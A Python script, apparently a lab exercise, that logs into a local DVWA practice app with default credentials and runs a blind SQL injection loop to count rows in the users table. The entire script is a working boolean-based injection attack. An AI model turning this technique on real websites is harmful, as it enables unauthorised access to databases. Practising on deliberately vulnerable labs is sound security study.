from bs4 import BeautifulSoup as bs
import re
import requests


# Target url for injection
target_url = 'http://localhost/vulnerabilities/sqli_blind/'

# For the next attacks, it is supposed, the admin/password is
# already hacked with dictionary_attack_login.py
login_url = 'http://localhost/login.php'
payload = {
    'username': 'admin',
    'password': 'password',
    'Login': 'Login'
}

# Open a new session to extract the links (possible targets)
with requests.Session() as session:
    # Get the login url
    r = session.get(login_url)
    
    # Extract user token
    token = re.search("user_token'\s*value='(.*?)'", r.text).group(1)
    payload['user_token'] = token

    # Login in the webpage
    p = session.post(login_url, data=payload)

    # Reach the vulnerable page for know the number of users (limit to whatever you want - here 100)
    limit = 100
    injection_malicious_string = "1' and (select count(*) from dvwa.users)={} and '0'='0"
    for number in range(0, limit):
        injection_malicious_string_number = injection_malicious_string.format(number)
        new_injection_url = f"{target_url}/?id={injection_malicious_string_number}&Submit=Submit#"
        injection_request = session.post(new_injection_url)

        # We should get the <pre> anchors which contains the results (with beatifulsoup)
        # Parse request p into tree
        tree = bs(injection_request.text, 'html.parser')

        # If the pre anchor has not MISSING is a match
        if 'MISSING' not in tree.find('pre').text:
            print(f'User table has {number} registers.')
        